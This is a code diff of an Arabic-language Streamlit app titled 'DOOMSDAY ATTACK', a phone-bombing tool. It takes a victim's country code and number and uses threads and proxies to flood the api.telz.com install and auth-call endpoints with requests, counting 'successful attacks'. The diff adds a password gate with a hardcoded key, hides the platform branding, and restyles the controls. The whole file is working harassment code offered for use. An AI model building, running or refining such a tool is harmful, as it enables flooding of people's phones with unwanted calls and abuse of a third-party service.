@@ -10,45 +10,82 @@ import webbrowser
 import os
 from concurrent.futures import ThreadPoolExecutor
 
-# --- إعدادات الصفحة والجمالية المخيفة ---
-st.set_page_config(page_title="GX3GX3 CONTROL PANEL", page_icon="💀", layout="wide")
+# --- إعدادات الصفحة وإخفاء شعارات GitHub و Streamlit ---
+st.set_page_config(page_title="DOOMSDAY ATTACK - GX3GX3", page_icon="💀", layout="wide")
 
-# CSS مخصص للوحة تحكم مخيفة واحترافية
 st.markdown("""
     <style>
+    /* إخفاء شعارات Streamlit و GitHub */
+    #MainMenu {visibility: hidden;}
+    footer {visibility: hidden;}
+    header {visibility: hidden;}
+    .stDeployButton {display:none;}
+    
+    /* تصميم الواجهة المخيفة */
     .main {
         background-color: #000000;
-        color: #00FF00;
+        color: #ff0000;
         font-family: 'Courier New', Courier, monospace;
+    }
+    .stTextInput>div>div>input {
+        background-color: #0a0a0a;
+        color: #ff0000;
+        border: 2px solid #ff0000;
+        text-align: center;
     }
     .stButton>button {
         width: 100%;
-        background-color: #ff0000;
+        background-color: #660000;
         color: white;
-        border-radius: 0px;
-        border: 1px solid #ffffff;
+        border: 2px solid #ff0000;
         font-weight: bold;
+        font-size: 20px;
     }
     .stButton>button:hover {
-        background-color: #8b0000;
-        border: 1px solid #ff0000;
+        background-color: #ff0000;
+        color: black;
     }
-    h1, h2, h3 {
-        color: #ff0000 !important;
-        text-shadow: 2px 2px #000000;
-    }
-    .reportview-container .main .block-container{
-        padding-top: 2rem;
-    }
-    .stTextInput>div>div>input {
-        background-color: #1a1a1a;
-        color: #00FF00;
-        border: 1px solid #ff0000;
+    .img-container {
+        border: 5px solid #ff0000;
+        padding: 10px;
+        background-color: #1a0000;
+        box-shadow: 0 0 20px #ff0000;
+        text-align: center;
     }
     </style>
     """, unsafe_allow_html=True)
 
-# --- تثبيت المكتبات تلقائياً (محفوظ كما هو) ---
+# --- نظام التحقق من المفتاح ---
+if 'authenticated' not in st.session_state:
+    st.session_state.authenticated = False
+
+if not st.session_state.authenticated:
+    st.markdown('<div class="img-container">', unsafe_allow_html=True)
+    st.image("https://files.catbox.moe/3cq9i1.jpg", use_container_width=True)
+    st.markdown('</div>', unsafe_allow_html=True)
+    
+    st.markdown("<h1 style='text-align: center; color: red;'>🔒 نظام التفعيل</h1>", unsafe_allow_html=True)
+    user_key = st.text_input("أدخل المفتاح الخاص بك للوصول إلى القوة:", type="password")
+    
+    if st.button("تفعيل الأداة 🔥"):
+        if user_key == "aligx3gx3":
+            st.session_state.authenticated = True
+            st.rerun()
+        else:
+            st.error("❌ المفتاح خطأ! تواصل مع المطور لتفعيل @PDD6P")
+    st.stop()
+
+# --- إذا تم التفعيل، تظهر الأداة كاملة ---
+
+# صورة البداية في إطار مخيف
+st.markdown('<div class="img-container">', unsafe_allow_html=True)
+st.image("https://files.catbox.moe/3cq9i1.jpg", use_container_width=True)
+st.markdown('</div>', unsafe_allow_html=True)
+
+st.markdown("<h1 style='text-align: center; color: #ff0000; font-size: 50px;'>هجـوم يوم القيامة</h1>", unsafe_allow_html=True)
+st.markdown("<h3 style='text-align: center; color: white;'>قناتي: gx3gx3 | المطور: @PDD6P</h3>", unsafe_allow_html=True)
+
+# --- تثبيت المكتبات تلقائياً (بدون حذف حرف واحد) ---
 def install_libs():
     libs = ['requests', 'termcolor', 'pyfiglet']
     for lib in libs:
@@ -63,14 +100,8 @@ import requests
 from termcolor import colored
 import pyfiglet
 
-# --- واجهة الحقوق والعنوان ---
-ascii_art = pyfiglet.figlet_format("GX3GX3", font="slant")
-st.text(ascii_art)
-st.title("💀 DARK DASHBOARD - BY GX3GX3")
-st.markdown("### 🛠 المطور: @PDD6P | حقوق القناة: [gx1gx1](https://t.me/gx1gx1)")
-st.divider()
-
-# --- المنطق البرمجي (بدون حذف أي شيء) ---
+# رابط القناة الجديد
+CH_LINK = 'https://t.me/gx3gx3'
 
 def generate_unique_ids():
     timestamp = int(time.time() * 1000)
@@ -137,24 +168,24 @@ def send_auth_call_request(url, headers, payload, proxy=None):
         return response.ok and "ok" in response.text
     except: return False
 
-# --- واجهة المستخدم لإدخال البيانات ---
-col1, col2 = st.columns(2)
-with col1:
-    country_code = st.text_input("🌍 أدخل رمز الدولة (بدون +):", value="964")
-with col2:
-    number = st.text_input("📱 أدخل الرقم (بدون المقدمة):")
-
-num_threads = st.slider("🚀 عدد الخيوط (Threads):", 1, 50, 15)
-
-# متغيرات الحالة لتحديث الواجهة
+# إعداد العدادات
 if 'stats' not in st.session_state:
     st.session_state.stats = {"ok": 0, "error": 0}
 if 'running' not in st.session_state:
     st.session_state.running = False
 
-def start_process(country_code, number, num_threads):
+# واجهة الإدخال
+col1, col2 = st.columns(2)
+with col1:
+    country_code = st.text_input("🌍 كود الدولة (بدون +):", value="964")
+with col2:
+    number = st.text_input("📱 رقم الهاتف (بدون مقدمة):")
+
+threads_count = st.slider("☣️ قوة الهجوم (Threads):", 1, 50, 15)
+
+def worker_task(country_code, number):
     foreign_langs = ["en", "fr", "de", "tr", "es", "pt", "it", "ko", "ru", "ja", "zh", "ar", "hi"]
-    proxies_list = load_proxies("gx1gx1.txt")
+    proxies_list = load_proxies()
     
     install_url = "https://api.telz.com/app/install"
     auth_call_url = "https://api.telz.com/app/auth_call"
@@ -189,24 +220,18 @@ def start_process(country_code, number, num_threads):
         except: st.session_state.stats["error"] += 1
 
         with placeholder.container():
-            st.metric("✅ Success", st.session_state.stats["ok"])
-            st.metric("❌ Failed", st.session_state.stats["error"])
-        
-        time.sleep(0.1) # لمنع تجميد المتصفح
+            st.metric("🔥 هجمات ناجحة", st.session_state.stats["ok"])
+            st.metric("💀 هجمات فاشلة", st.session_state.stats["error"])
+        time.sleep(0.05)
 
-# أزرار التحكم
-if st.button("🔥 START ATTACK"):
+if st.button("⚠️ بـدء الهجـوم"):
     if number:
         st.session_state.running = True
-        st.success(f"تم بدء العملية للرقم: +{country_code}{number}")
-        start_process(country_code, number, num_threads)
+        worker_task(country_code, number)
     else:
-        st.error("الرجاء إدخال رقم الهاتف أولاً!")
+        st.error("أدخل الرقم أولاً يا وحش!")
 
-if st.button("🛑 STOP"):
+if st.button("❌ إيقاف"):
     st.session_state.running = False
-    st.warning("تم إيقاف العملية.")
+    st.warning("تم إيقاف الهجوم.")
 
-# --- تذييل الصفحة ---
-st.markdown("---")
-st.markdown("<p style='text-align: center; color: gray;'>Developed by @PDD6P | Rights Reserved to GX3GX3</p>", unsafe_allow_html=True)
